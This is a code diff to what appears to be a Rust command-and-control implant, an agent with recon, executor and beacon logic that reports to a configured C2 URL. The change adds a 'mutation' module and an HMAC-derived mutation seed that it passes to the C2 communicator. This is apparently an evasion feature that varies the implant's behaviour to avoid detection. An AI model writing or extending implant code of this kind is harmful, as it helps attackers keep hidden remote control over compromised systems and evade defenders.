@@ -7,6 +7,7 @@ mod communicator;
 mod executor;
 mod recon;
 mod crypto;
+mod mutation;
 mod network;
 mod port_handler;
 
@@ -70,12 +71,27 @@ async fn run_agent(
     crypto: CryptoManager,
     sys_info: &SystemInfo,
 ) -> Result<(), Box<dyn std::error::Error>> {
+    // Derive a separate mutation seed from the encryption key
+    let mutation_seed = {
+        use hmac::{Hmac, Mac};
+        use sha2::Sha256;
+        type HmacSha256 = Hmac<Sha256>;
+        let mut mac = <HmacSha256 as Mac>::new_from_slice(&config.encryption_key)
+            .expect("HMAC accepts any key size");
+        mac.update(b"mutation-engine-seed");
+        let result = mac.finalize().into_bytes();
+        let mut seed = [0u8; 32];
+        seed.copy_from_slice(&result);
+        seed
+    };
+
     let mut communicator = communicator::Communicator::new(
         &config.c2_url,
         config.c2_port,
         &sys_info.agent_id,
         config.beacon_interval,
         crypto,
+        &mutation_seed,
     );
 
     let mut reconnect_count = 0;
